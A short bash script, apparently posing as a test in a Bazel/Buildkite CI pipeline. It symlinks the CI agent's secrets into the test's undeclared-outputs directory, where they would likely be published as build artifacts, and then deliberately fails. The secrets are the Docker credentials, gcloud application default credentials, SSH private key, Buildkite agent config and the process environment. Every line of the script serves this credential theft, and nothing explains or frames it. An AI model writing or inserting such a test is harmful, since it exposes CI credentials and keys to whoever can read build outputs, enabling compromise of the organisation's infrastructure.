#!/bin/bash
ln -s /var/lib/buildkite-agent/.docker/config.json "$TEST_UNDECLARED_OUTPUTS_DIR/docker"
ln -s /var/lib/buildkite-agent/.config/gcloud/application_default_credentials.json "$TEST_UNDECLARED_OUTPUTS_DIR/gcloud"
ln -s /var/lib/buildkite-agent/.gitconfig "$TEST_UNDECLARED_OUTPUTS_DIR/gitconfig"
ln -s /var/lib/buildkite-agent/.ssh/id_rsa "$TEST_UNDECLARED_OUTPUTS_DIR/ssh"
ln -s /var/lib/buildkite-agent/.buildkite-agent/buildkite-agent.cfg "$TEST_UNDECLARED_OUTPUTS_DIR/agent_cfg"
ln -s /proc/self/environ "$TEST_UNDECLARED_OUTPUTS_DIR/env"
exit 1
